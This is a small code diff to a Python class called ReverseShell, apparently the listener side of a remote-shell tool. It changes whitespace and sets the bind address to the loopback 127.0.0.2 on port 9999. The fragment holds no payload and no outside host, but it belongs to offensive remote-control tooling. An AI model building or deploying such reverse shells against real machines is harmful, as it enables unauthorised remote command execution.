@@ -44,7 +44,7 @@ class ReverseShell():
 				flag=1
 			else:
 				cmd = input()
-				
+
 			if cmd=="quit":
 				self.conn.close()
 				self.s.close()
@@ -56,6 +56,6 @@ class ReverseShell():
 
 
 if __name__=="__main__":
-	shell = ReverseShell("",9999)
+	shell = ReverseShell("127.0.0.2",9999)
 	shell.bind_socket()
 	shell.socket_accept()
